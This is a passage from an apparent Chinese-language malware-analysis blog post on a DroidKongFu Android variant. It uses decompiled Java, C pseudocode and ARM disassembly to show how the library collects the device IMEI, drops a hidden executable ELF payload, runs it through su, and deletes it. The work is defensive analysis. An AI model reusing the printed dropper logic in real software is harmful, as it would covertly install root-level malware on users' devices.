<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static &#123;</span><br><span class="line">    System.loadLibrary(&quot;vadgo&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>onCreate()方法获取了mCh、mId、mPkg这三个成员变量，分别记录了元数据MYAD_PID、设备的IMEI和程序包名，然后启动了线程。该线程run()方法中通过调用DataInit()来对三个值进行传递。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Object value2 = getPackageManager().getApplicationInfo(getPackageName(), <span class="number">128</span>).metaData.get(<span class="string">&quot;MYAD_PID&quot;</span>);<span class="comment">//获取元数据</span></span><br><span class="line">        <span class="keyword">if</span> (value2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.mCh = (String) value2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.mId = ((TelephonyManager) getSystemService(<span class="string">&quot;phone&quot;</span>)).getDeviceId();<span class="comment">//获取IMEI</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.mId == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.mId = Settings.System.getString(getContentResolver(), <span class="string">&quot;android_id&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.mPkg = getPackageName();<span class="comment">//获取包名</span></span><br><span class="line">    <span class="keyword">new</span> Thread() &#123;</span><br><span class="line">        <span class="comment">/* class com.airpuh.ad.UpdateCheck.AnonymousClass1 */</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            UpdateCheck.<span class="keyword">this</span>.DataInit(UpdateCheck.<span class="keyword">this</span>.mId, UpdateCheck.<span class="keyword">this</span>.mCh, UpdateCheck.<span class="keyword">this</span>.mPkg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;.start();<span class="comment">//启动线程</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>DataInit()是一个Native方法，将mCh、mId、mPkg这三个值传递过去，这里代码就从java层进入到了Native层。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public native boolean DataInit(String str, String str2, String str3);</span><br></pre></td></tr></table></figure>

<h3 id="Native层"><a href="#Native层" class="headerlink" title="Native层"></a>Native层</h3><p>使用IDA打开libvadgo.so文件，首先可以在导出表中定位java_com_airpuh_ad_UpdateCheck_DataInit函数</p>
<img src="/2023/03/12/DroidKonngFu%E5%8F%98%E7%A7%8D%E7%97%85%E6%AF%92%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/image-20231010173114906.png" class title="image-20231010173114906">

<p>在IDA中按f5获取c语言代码，该片段代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#释放病毒主体</span><br><span class="line"><span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));  <span class="comment">//对s进行初始化，清空存储空间用来存入sprintf组成的字符串</span></span><br><span class="line">time(&amp;timer);   <span class="comment">//返回当前时间</span></span><br><span class="line">srand48(timer);  <span class="comment">//初始化timer</span></span><br><span class="line">v11 = lrand48();   <span class="comment">//获取一个正的长整型随机数，获取系统时间作为随机数种子</span></span><br><span class="line"><span class="built_in">sprintf</span>(s, <span class="string">&quot;%s/%s/.e%dd&quot;</span>, <span class="string">&quot;/data/data&quot;</span>, v9, v11);</span><br><span class="line">v12 = open(s, <span class="number">578</span>, <span class="number">384</span>);  <span class="comment">//创建恶意文件</span></span><br><span class="line"></span><br><span class="line">#判断程序路径以及开启su权限的管道</span><br><span class="line"><span class="keyword">if</span> ( v12 &gt;= <span class="number">0</span></span><br><span class="line">      &amp;&amp; (v14 = (<span class="keyword">char</span> *)write(v12, &amp;_bindata, (<span class="keyword">size_t</span>)aEncodingUtf8St),  <span class="comment">//写入恶意文件</span></span><br><span class="line">          close(v13),</span><br><span class="line">          sync(),</span><br><span class="line">          sync(),</span><br><span class="line">          chmod(s, <span class="number">0x1ED</span>u),  <span class="comment">//加上可执行权限</span></span><br><span class="line">          v14 == aEncodingUtf8St)</span><br><span class="line">      &amp;&amp; (!access(SYS_BIN_SU, <span class="number">0</span>) ? (v19 = popen(SYS_BIN_SU, <span class="string">&quot;w&quot;</span>)) : (v19 = popen(SYS_XBIN_SU, <span class="string">&quot;w&quot;</span>)), v19) )</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//执行病毒主体</span></span><br><span class="line">    <span class="built_in">memset</span>(v22, <span class="number">0</span>, <span class="number">0xFF</span>u);</span><br><span class="line">      <span class="built_in">sprintf</span>(v22, <span class="string">&quot;%s %s %s\n&quot;</span>, CMD_SET_PROP, PROP_RUNNING_ID, v7);</span><br><span class="line">      v15 = <span class="built_in">strlen</span>(v22);</span><br><span class="line">      fwrite(v22, <span class="number">1u</span>, v15, v19);</span><br><span class="line">      fflush(v19);</span><br><span class="line">      <span class="built_in">memset</span>(v22, <span class="number">0</span>, <span class="number">0xFF</span>u);</span><br><span class="line">      <span class="built_in">sprintf</span>(v22, <span class="string">&quot;%s %s %s\n&quot;</span>, CMD_SET_PROP, PROP_RUNNING_CH, v8);</span><br><span class="line">      v16 = <span class="built_in">strlen</span>(v22);</span><br><span class="line">      fwrite(v22, <span class="number">1u</span>, v16, v19);</span><br><span class="line">      fflush(v19);</span><br><span class="line">      <span class="built_in">memset</span>(v22, <span class="number">0</span>, <span class="number">0xFF</span>u);</span><br><span class="line">      <span class="built_in">sprintf</span>(v22, <span class="string">&quot;%s\n&quot;</span>, s);</span><br><span class="line">      v17 = <span class="built_in">strlen</span>(v22);</span><br><span class="line">      fwrite(v22, <span class="number">1u</span>, v17, v19);</span><br><span class="line">      fflush(v19);</span><br><span class="line">      <span class="built_in">memset</span>(v22, <span class="number">0</span>, <span class="number">0xFF</span>u);</span><br><span class="line">      <span class="built_in">strcpy</span>(v22, <span class="string">&quot;exit\n&quot;</span>);</span><br><span class="line">      v18 = <span class="built_in">strlen</span>(v22);</span><br><span class="line">      fwrite(v22, <span class="number">1u</span>, v18, v19);</span><br><span class="line">      fflush(v19);</span><br><span class="line">      pclose(v19);</span><br><span class="line">      sleep(<span class="number">0x12C</span>u);</span><br><span class="line">      unlink(s);      <span class="comment">//删除文件</span></span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>开始代码如下：</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">0000093</span>C <span class="comment">; __unwind &#123;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000093</span>C                 <span class="keyword">PUSH</span>    &#123;<span class="built_in">R4</span>-<span class="built_in">R7</span>,<span class="built_in">LR</span>&#125;  <span class="comment">;将R4-R7以及LR寄存器的值压入堆栈</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000093</span>E                 <span class="keyword">MOV</span>     <span class="built_in">R7</span>, <span class="built_in">R11</span>     <span class="comment">;下面四行是将R8-R11的寄存值保存在R4-R7</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000940</span>                 <span class="keyword">MOV</span>     <span class="built_in">R6</span>, <span class="built_in">R10</span>      </span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000942</span>                 <span class="keyword">MOV</span>     <span class="built_in">R5</span>, <span class="built_in">R9</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000944</span>                 <span class="keyword">MOV</span>     <span class="built_in">R4</span>, <span class="built_in">R8</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000946</span>                 <span class="keyword">PUSH</span>    &#123;<span class="built_in">R4</span>-<span class="built_in">R7</span>&#125;     <span class="comment">;将R8-R11寄存器的值压入堆栈</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000948</span>                 <span class="keyword">LDR</span>     <span class="built_in">R4</span>, <span class="number">=0xFFFFFDE4</span>  <span class="comment">;将内存地址中的数据传给寄存器R4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000094</span>A                 <span class="keyword">MOVS</span>    <span class="built_in">R7</span>, <span class="built_in">R3</span>           <span class="comment">;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000094</span>C                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, =(__stack_chk_guard_ptr - <span class="number">0x10C8</span>)<span class="comment">;相对GOT表的偏移</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000094</span>E                 <span class="keyword">ADD</span>     <span class="built_in">SP</span>, <span class="built_in">R4</span>           :开辟栈的空间，加<span class="built_in">R4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000950</span>                 <span class="keyword">LDR</span>     <span class="built_in">R4</span>, =(_GLOBAL_OFFSET_TABLE_ - <span class="number">0x95A</span>) <span class="comment">;保存数据存取的基址</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000952</span>                 <span class="keyword">MOV</span>     <span class="built_in">R9</span>, <span class="built_in">R3</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000954</span>                 <span class="keyword">LDR</span>     <span class="built_in">R1</span>, [<span class="built_in">SP</span>,<span class="number">#0x240</span>+arg_0]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000956</span>                 <span class="keyword">ADD</span>     <span class="built_in">R4</span>, <span class="built_in">PC</span>          <span class="comment">; _GLOBAL_OFFSET_TABLE_</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000958</span>                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R4</span>,<span class="built_in">R3</span>]     <span class="comment">; __stack_chk_guard</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000095</span>A                 <span class="keyword">MOVS</span>    <span class="built_in">R6</span>, <span class="number">#0x2A4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000095</span>E                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R3</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000960</span>                 <span class="keyword">MOV</span>     <span class="built_in">R8</span>, <span class="built_in">R1</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000962</span>                 <span class="keyword">MOVS</span>    <span class="built_in">R1</span>, <span class="built_in">R2</span>          <span class="comment">;Android设备ID</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000964</span>                 <span class="keyword">STR</span>     <span class="built_in">R3</span>, [<span class="built_in">SP</span>,<span class="number">#0x240</span>+var_2C] <span class="comment">;保存R3寄存器，用于堆栈完整性检查</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000966</span>                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R0</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000968</span>                 <span class="keyword">MOVS</span>    <span class="built_in">R2</span>, <span class="number">#0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000096</span>A                 <span class="keyword">MOVS</span>    <span class="built_in">R5</span>, <span class="built_in">R0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000096</span>C                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R3</span>,<span class="built_in">R6</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000096</span>E                 <span class="keyword">BLX</span>     <span class="built_in">R3</span>             :跳转到<span class="built_in">R3</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000970</span>                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R5</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000972</span>                 <span class="keyword">MOV</span>     <span class="built_in">R11</span>, <span class="built_in">R0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000974</span>                 <span class="keyword">MOVS</span>    <span class="built_in">R1</span>, <span class="built_in">R7</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000976</span>                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R3</span>,<span class="built_in">R6</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000978</span>                 <span class="keyword">MOVS</span>    <span class="built_in">R0</span>, <span class="built_in">R5</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000097</span>A                 <span class="keyword">MOVS</span>    <span class="built_in">R2</span>, <span class="number">#0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000097</span>C                 <span class="keyword">BLX</span>     <span class="built_in">R3</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000097</span>E                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R5</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000980</span>                 <span class="keyword">MOV</span>     <span class="built_in">R1</span>, <span class="built_in">R8</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000982</span>                 <span class="keyword">MOV</span>     <span class="built_in">R10</span>, <span class="built_in">R0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000984</span>                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R3</span>,<span class="built_in">R6</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000986</span>                 <span class="keyword">MOVS</span>    <span class="built_in">R0</span>, <span class="built_in">R5</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000988</span>                 <span class="keyword">MOVS</span>    <span class="built_in">R2</span>, <span class="number">#0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000098</span>A                 <span class="keyword">BLX</span>     <span class="built_in">R3</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000098</span>C                 <span class="keyword">MOV</span>     <span class="built_in">R1</span>, <span class="built_in">R11</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000098</span>E                 <span class="keyword">MOVS</span>    <span class="built_in">R5</span>, <span class="built_in">R0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000990</span>                 <span class="keyword">MOVS</span>    <span class="built_in">R0</span>, <span class="number">#0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000992</span>                 <span class="keyword">CMP</span>     <span class="built_in">R1</span>, <span class="number">#0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000994</span>                 <span class="keyword">BNE</span>     loc_998       :与cmp搭配，BNE不相等跳转，比较<span class="built_in">R1</span>和<span class="number">0</span>，不相等则跳转到loc_998</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000996</span>                 <span class="keyword">B</span>       loc_B1C       <span class="comment">;直接跳转到loc_B1</span></span><br></pre></td></tr></table></figure>

<p>在上述代码中值得注意的是”<strong>LDR     R3, [R4,R3]</strong> “这一条指令，可以看到其后面的注释为”<strong>_stack_chk_guard</strong>“，这是软件安全技术中的堆栈保护技术(GCC Stack Smashing Protector)的一部分，用来防止堆栈溢出造成的溢出漏洞攻击，生成的代码会被添加上堆栈保护代码。在Android系统源代码的bionic\libc\bionic\ssp.c文件中可以看到其实现机制，由_guard_setup()函数设置，是&#x2F;dev&#x2F;urandom设备生成的一个随机数。我们再来看看函数返回时相应的处理代码loc_B1C：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000B1C loc_B1C                                 ; CODE XREF: Java_com_airpuh_ad_UpdateCheck_DataInit+5A↑j</span><br><span class="line">.text:00000B1C                                         ; Java_com_airpuh_ad_UpdateCheck_DataInit+206↓j</span><br><span class="line">.text:00000B1C                 MOV     R2, R9</span><br><span class="line">.text:00000B1E                 LDR     R3, [R4,R2]     ; __stack_chk_guard</span><br><span class="line">.text:00000B20                 LDR     R2, [SP,#0x240+var_2C]</span><br><span class="line">.text:00000B22                 LDR     R3, [R3]</span><br><span class="line">.text:00000B24                 CMP     R2, R3</span><br><span class="line">.text:00000B26                 BNE     loc_B5C</span><br><span class="line">.text:00000B28                 MOVS    R3, #0x21C</span><br><span class="line">.text:00000B2C                 ADD     SP, R3</span><br><span class="line">.text:00000B2E                 POP     &#123;R2-R5&#125;</span><br><span class="line">.text:00000B30                 MOV     R8, R2</span><br><span class="line">.text:00000B32                 MOV     R9, R3</span><br><span class="line">.text:00000B34                 MOV     R10, R4</span><br><span class="line">.text:00000B36                 MOV     R11, R5</span><br><span class="line">.text:00000B38                 POP     &#123;R4-R7,PC&#125;</span><br></pre></td></tr></table></figure>

<p>函数返回时重新读取堆栈上的值与原先_stack_chk_guard的值进行比较。</p>
<p>我们继续跟踪loc_998，首先跳转到init_predata，然后通过判断java代码传递过来的META DATA是否为空，若为空则跳转到loc_B54，否则就跳转到loc_9A4</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000998 loc_998                                 ; CODE XREF: Java_com_airpuh_ad_UpdateCheck_DataInit+58↑j</span><br><span class="line">.text:00000998                 BL      init_predata</span><br><span class="line">.text:0000099C                 MOV     R2, R10</span><br><span class="line">.text:0000099E                 CMP     R2, #0</span><br><span class="line">.text:000009A0                 BNE     loc_9A4</span><br><span class="line">.text:000009A2                 B       loc_B54</span><br></pre></td></tr></table></figure>

<p>先来看init_predata函数，该函数功能是进行<strong>字符串解密操作</strong>，程序运行时需要将之前加密的字符串进行动态的解密操作。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000894 init_predata                            ; CODE XREF: Java_com_airpuh_ad_UpdateCheck_DataInit:loc_998↓p</span><br><span class="line">.text:00000894                                         ; DATA XREF: LOAD:00000018↑o ...</span><br><span class="line">.text:00000894 ; __unwind &#123;</span><br><span class="line">.text:00000894                 BLMI    0x8D2D24</span><br><span class="line">.text:00000898                 STMPL   R11, &#123;R0,R3-R6,R10,LR&#125;^</span><br><span class="line">.text:0000089C                 BCS     0x1E90C</span><br><span class="line">.text:000008A0                 BICSMI  SP, R2, #5</span><br><span class="line">.text:000008A4                 MOVWCC  R7, #0x101A</span><br><span class="line">.text:000008A8                 BCS     0x1E918</span><br><span class="line">.text:000008AC                 BLMI    0x7B5098</span><br><span class="line">.text:000008B0                 LDMDAVC R10, &#123;R0,R1,R3,R6,R7,R11,R12,LR&#125;</span><br><span class="line">.text:000008B4                 ANDLE   R2, R5, R0,LSL#20</span><br><span class="line">.text:000008B8                 LDRSBVC R4, [R10],-R2</span><br><span class="line">.text:000008BC                 LDMDAVC R10, &#123;R0,R8,R9,R12,SP&#125;</span><br><span class="line">.text:000008C0                 MVNSLE  R2, R0,LSL#20</span><br><span class="line">.text:000008C4                 STMPL   R11, &#123;R0,R3,R4,R8,R9,R11,LR&#125;^</span><br><span class="line">.text:000008C8                 BCS     0x1E938</span><br><span class="line">.text:000008CC                 BICSMI  SP, R2, #5</span><br><span class="line">.text:000008D0                 MOVWCC  R7, #0x101A</span><br><span class="line">.text:000008D4                 BCS     0x1E944</span><br><span class="line">.text:000008D8                 BLMI    0x5750C4</span><br><span class="line">.text:000008DC                 LDMDAVC R10, &#123;R0,R1,R3,R6,R7,R11,R12,LR&#125;</span><br><span class="line">.text:000008E0                 ANDLE   R2, R5, R0,LSL#20</span><br><span class="line">.text:000008E4                 LDRSBVC R4, [R10],-R2</span><br><span class="line">.text:000008E8                 LDMDAVC R10, &#123;R0,R8,R9,R12,SP&#125;</span><br><span class="line">.text:000008EC                 MVNSLE  R2, R0,LSL#20</span><br><span class="line">.text:000008F0                 STMPL   R11, &#123;R4,R8,R9,R11,LR&#125;^</span><br><span class="line">.text:000008F4                 BCS     0x1E964</span><br><span class="line">.text:000008F8                 BICSMI  SP, R2, #5</span><br><span class="line">.text:000008FC                 MOVWCC  R7, #0x101A</span><br><span class="line">.text:00000900                 BCS     0x1E970</span><br><span class="line">.text:00000904                 BLMI    0x3350F0</span><br><span class="line">.text:00000908                 LDMDAVC R10, &#123;R0,R1,R3,R6,R7,R11,R12,LR&#125;</span><br><span class="line">.text:0000090C                 ANDLE   R2, R5, R0,LSL#20</span><br><span class="line">.text:00000910                 LDRSBVC R4, [R10],-R2</span><br><span class="line">.text:00000914                 LDMDAVC R10, &#123;R0,R8,R9,R12,SP&#125;</span><br><span class="line">.text:00000918                 MVNSLE  R2, R0,LSL#20</span><br><span class="line">.text:0000091C                 CODE16</span><br><span class="line">.text:0000091C                 BX      LR</span><br><span class="line">.text:0000091C ; End of function init_predata</span><br></pre></td></tr></table></figure>

<p>接下来就是<strong>释放病毒主体</strong>，当META DATA为空时，跳转到local_B54将R10设置为“self”字符串地址，然后跳转到loc_9A4</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000B54 loc_B54                                 ; CODE XREF: Java_com_airpuh_ad_UpdateCheck_DataInit+66↑j</span><br><span class="line">.text:00000B54                 LDR     R3, =(__data_start_ptr - 0x10C8)</span><br><span class="line">.text:00000B56                 LDR     R3, [R4,R3]     ; __data_start</span><br><span class="line">.text:00000B58                 MOV     R10, R3</span><br><span class="line">.text:00000B5A                 B       loc_9A4</span><br></pre></td></tr></table></figure>

<p>当META DATA不为空时，也直接跳转到loc_9A4.继续跟踪loc_9A4</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000009A4 loc_9A4                                 ; CODE XREF: Java_com_airpuh_ad_UpdateCheck_DataInit+64↑j</span><br><span class="line">.text:000009A4                                         ; Java_com_airpuh_ad_UpdateCheck_DataInit+21E↓j</span><br><span class="line">.text:000009A4                 ADD     R6, SP, #0x240+s</span><br><span class="line">.text:000009A6                 MOVS    R2, #0x80</span><br><span class="line">.text:000009A8                 MOVS    R1, #0          ; 填0</span><br><span class="line">.text:000009AA                 LSLS    R2, R2, #1      ; 填入长度0x100</span><br><span class="line">.text:000009AC                 MOVS    R0, R6          ; 缓冲区</span><br><span class="line">.text:000009AE                 BLX     memset          : 清空一个存储空间用来存入sprintf组成的字符串</span><br><span class="line">.text:000009B2                 ADD     R0, SP, #0x240+timer ; timer</span><br><span class="line">.text:000009B4                 BLX     time            ; 获取系统时间作为随机种子</span><br><span class="line">.text:000009B8                 LDR     R0, [SP,#0x240+timer] ; seedval</span><br><span class="line">.text:000009BA                 BLX     srand48</span><br><span class="line">.text:000009BE                 BLX     lrand48         ; 生成的随机数作为释放的恶意文件名</span><br><span class="line">.text:000009C2                 LDR     R1, =(aSSEDd - 0x9CC) ; &quot;%s/%s/.e%dd&quot;</span><br><span class="line">.text:000009C4                 LDR     R2, =(aDataData - 0x9CE) ; &quot;/data/data&quot;</span><br><span class="line">.text:000009C6                 STR     R0, [SP,#0x240+var_240]</span><br><span class="line">.text:000009C8                 ADD     R1, PC          ; &quot;%s/%s/.e%dd&quot;</span><br><span class="line">.text:000009CA                 ADD     R2, PC          ; &quot;/data/data&quot;</span><br><span class="line">.text:000009CC                 MOVS    R0, R6          ; 赋予前面meset的缓冲区</span><br><span class="line">.text:000009CE                 MOVS    R3, R5</span><br><span class="line">.text:000009D0                 BLX     sprintf</span><br><span class="line">.text:000009D4                 MOVS    R2, #0xC0</span><br><span class="line">.text:000009D6                 MOVS    R0, R6          ; file</span><br><span class="line">.text:000009D8                 LDR     R1, =0x242      ; oflag</span><br><span class="line">.text:000009DA                 LSLS    R2, R2, #1</span><br><span class="line">.text:000009DC                 BLX     open            ; 创建恶意文件</span><br><span class="line">.text:000009E0                 SUBS    R7, R0, #0</span><br><span class="line">.text:000009E2                 BGE     loc_9E6</span><br><span class="line">.text:000009E4                 B       loc_B3A</span><br><span class="line"></span><br><span class="line">.text:000009E6 loc_9E6                                 ; CODE XREF: Java_com_airpuh_ad_UpdateCheck_DataInit+A6↑j</span><br><span class="line">.text:000009E6                 LDR     R3, =(__bindata_ptr - 0x10C8)</span><br><span class="line">.text:000009E8                 MOVS    R0, R7          ; fd</span><br><span class="line">.text:000009EA                 LDR     R1, [R4,R3]     ; __bindata ; buf</span><br><span class="line">.text:000009EC                 LDR     R3, =aEncodingUtf8St ; &quot;encoding=&#x27;utf-8&#x27; standalone=&#x27;yes&#x27; ?&gt;\n&quot;</span><br><span class="line">.text:000009EE                 MOVS    R2, R3          ; n</span><br><span class="line">.text:000009F0                 MOV     R8, R3</span><br><span class="line">.text:000009F2                 BLX     write           ; 写入恶意文件</span><br><span class="line">.text:000009F6                 MOVS    R5, R0          ; 实际写入的长度</span><br><span class="line">.text:000009F8                 MOVS    R0, R7          ; fd</span><br><span class="line">.text:000009FA                 BLX     close</span><br><span class="line">.text:000009FE                 BLX     sync            ; 强制刷新</span><br><span class="line">.text:00000A02                 BLX     sync</span><br><span class="line">.text:00000A06                 MOVS    R0, R6          ; file</span><br><span class="line">.text:00000A08                 LDR     R1, =0x1ED      ; 775u</span><br><span class="line">.text:00000A0A                 BLX     chmod           ; 赋予可执行权限 </span><br><span class="line">.text:00000A0E                 CMP     R5, R8</span><br><span class="line">.text:00000A10                 BEQ     loc_A14</span><br><span class="line">.text:00000A12                 B       loc_B3A</span><br></pre></td></tr></table></figure>

<p>首先调用meset()函数清空内存区域用于后面存入病毒文件名，使用time()获取系统时间，使用lrand48()对获取的系统时间生成随机数，病毒文件名采用”.e&lt;随机数&gt;d”的格式生成文件名，该文件为隐藏文件。构造好完整的病毒文件后，调用open()函数创建了病毒文件，接着使用write()函数写入文件，写入的内容起始地址指向____bindata ， 跳转到该地址，可以看到前4个字节为”7F  45  4C  46”,这四个字节为ELF文件的标识</p>
<img src="/2023/03/12/DroidKonngFu%E5%8F%98%E7%A7%8D%E7%97%85%E6%AF%92%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/image-20231011204037945.png" class title="image-20231011204037945">

<p>写入长度为0x699c，文件大小为27036字节，文件写完后使用close()关闭文件流，sync()函数强制刷新，chmod()函数添加执行权限。病毒发作后，在进程中无法找到生成的病毒主体，是由于在执行完主体后调用unlink()函数将其删除。所以需要我们去手工dump下来病毒主体，使用二进制编辑器打开libvadgo.so文件，直接跳转到病毒主体起始地址0x1194，如下所示开头为ELF标准的文件开头。</p>
<img src="/2023/03/12/DroidKonngFu%E5%8F%98%E7%A7%8D%E7%97%85%E6%AF%92%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/image-20231012173510390.png" class title="image-20231012173510390">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p>选取0x1194到0x7b30的内容另存为evil.bin文件，该文件即位病毒主体。</p>
<img src="/2023/03/12/DroidKonngFu%E5%8F%98%E7%A7%8D%E7%97%85%E6%AF%92%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/image-20231012174700067.png" class title="image-20231012174700067">

<p>病毒主体释放完就是<strong>开启su权限管道</strong>，代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000A14 loc_A14                                 ; CODE XREF: Java_com_airpuh_ad_UpdateCheck_DataInit+D4↑j</span><br><span class="line">.text:00000A14                 LDR     R3, =(SYS_BIN_SU_ptr - 0x10C8)  </span><br><span class="line">.text:00000A16                 MOVS    R1, #0          ; type</span><br><span class="line">.text:00000A18                 LDR     R5, [R4,R3]     ; SYS_BIN_SU</span><br><span class="line">.text:00000A1A                 MOVS    R0, R5          ; name</span><br><span class="line">.text:00000A1C                 BLX     access          ; 判断/system/bin/su是否可以访问</span><br><span class="line">.text:00000A20                 CMP     R0, #0          ; 当R0==0时表示文件可访问</span><br><span class="line">.text:00000A22                 BEQ     loc_A26         ; 文件可访问就popen(“/system/bin/su”，w)</span><br><span class="line">.text:00000A24                 B       loc_B44         ; 不可访问就popen(&quot;/system/xbin/su&quot;,w)</span><br><span class="line">.text:00000A26 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000A26</span><br><span class="line">.text:00000A26 loc_A26                                 ; CODE XREF: Java_com_airpuh_ad_UpdateCheck_DataInit+E6↑j</span><br><span class="line">.text:00000A26                 LDR     R1, =(aW - 0xA2E) ; &quot;w&quot;</span><br><span class="line">.text:00000A28                 MOVS    R0, R5          ; command</span><br><span class="line">.text:00000A2A                 ADD     R1, PC          ; &quot;w&quot;</span><br><span class="line">.text:00000A2C                 BLX     popen           ; 创建管道运行/system/bin/su</span><br><span class="line">.text:00000A30                 ADDS    R7, R0, #0</span><br><span class="line">.text:00000A32</span><br><span class="line">.text:00000A32 loc_A32                                 ; CODE XREF: Java_com_airpuh_ad_UpdateCheck_DataInit+216↓j</span><br><span class="line">.text:00000A32                 CMP     R7, #0          ; 判断管道是否创建成功，成功的话R7不等于0</span><br><span class="line">.text:00000A34                 BNE     loc_A38         ; 成功则调用loc_A38执行病毒本体</span><br><span class="line">.text:00000A36                 B       loc_B3A         ; 否则删除病毒本体后退出</span><br></pre></td></tr></table></figure>

<p>通过access()函数判断su可执行程序的路径，su是系统权限提升程序，所以病毒在运行前需要保证手机已经ROOT(在程序开头就对设备的ROOT权限进行了判断)。在检测完su的程序路径后，调用popen()函数创建管道，如果系统中存在su权限管理程序则弹出权限请求程序对话框。接着再判断管道是否创建成功，成功则跳转到loc_A38执行病毒本体，否则就跳转到loc_B3A删除病毒本体然后退出函数。</p>
<p>在上述的创建管道成功后，接下来就是<strong>执行病毒本体</strong>，代码如下</p>
